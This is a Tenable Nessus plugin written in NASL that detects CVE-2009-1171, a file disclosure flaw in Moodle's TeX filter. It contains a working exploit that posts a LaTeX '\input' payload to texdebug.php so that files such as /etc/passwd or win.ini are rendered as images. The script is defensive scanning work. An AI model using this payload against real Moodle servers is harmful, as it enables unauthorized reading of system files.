#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(36050);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2016/05/16 14:12:49 $");

  script_cve_id("CVE-2009-1171");
  script_bugtraq_id(34278);
  script_osvdb_id(52998);

  script_name(english:"Moodle LaTeX Information Disclosure");
  script_summary(english:"Attempts to use 'texdebug.php' to generate a graphic image.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
an information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The TeX filter included with the installed version of Moodle can be
exploited to reveal the contents of files on the remote host, subject
to the privileges under which the web server operates.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/502231/30/0/threaded");
  script_set_attribute(attribute:"solution", value:
"Disable the TeX Notation filter, use the included mimetex filter, or
configure LaTeX using the more restrictive 'openin_any=p' option.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20);

  script_set_attribute(attribute:"plugin_publication_date", value:"2009/03/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:moodle:moodle");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("moodle_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("www/PHP", "installed_sw/Moodle");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "Moodle";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

# Make sure the texdebug script is accessible.
url = dir + "/filter/tex/texdebug.php";
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

if (
  "title>TeX Filter Debugger<" >< res[2] &&
  'value="ShowOutputTex"' >< res[2]
)
{
  # Loop through files.
  foreach file (files)
  {
    # Try to generate a GIF image.
    exploit = '\\input ' + file;

    postdata = "tex=" + urlencode(str:exploit) + "&" + "action=ShowImageTex";

    res = http_send_recv3(
      method      : "POST",
      port        : port,
      item        : url,
      data        : postdata,
      add_headers : make_array("Content-Type", "application/x-www-form-urlencoded"),
      exit_on_fail: TRUE
    );

    # There's a problem if we see a GIF file.
    if ("image/gif" >< res[1])
    {
      if (report_verbosity > 0)
      {
        req_str = http_last_sent_request();
        report =
          '\n' + 'Nessus was able to exploit the issue to reveal the contents of' +
          '\n' + "'" + file + "' as a graphic image using the following request :" +
          '\n' +
          '\n' + '  ' + req_str + 
          '\n';
        security_warning(port:port, extra:report);
      }
      else security_warning(port);
      exit(0);
    }
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
